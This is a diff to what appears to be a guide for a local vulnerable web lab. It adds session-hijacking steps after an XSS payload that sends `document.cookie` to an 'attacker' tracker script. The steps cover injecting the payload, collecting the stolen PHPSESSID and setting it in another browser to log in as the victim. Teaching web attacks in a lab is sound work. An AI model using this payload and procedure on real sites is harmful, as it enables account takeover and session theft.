@@ -39,6 +39,12 @@ The "Data Type" column categorizes the stolen information:
   ```html
   <script>new Image().src="http://localhost:8000/attacker/tracker.php?sid=" + document.cookie;</script>
   ```
+- **How to Execute**:
+  1. Inject the payload into a vulnerable field (like the search bar).
+  2. Visit the attacker dashboard to view the stolen `PHPSESSID` cookie.
+  3. Open a new browser or private window and navigate to `http://localhost:8000`.
+  4. Use browser developer tools to manually set the `PHPSESSID` cookie to the value you stole.
+  5. Refresh the page. You will now be logged in as the victim.
 
 ### 3. Defacement
 **Objective**: Visually alter the website.
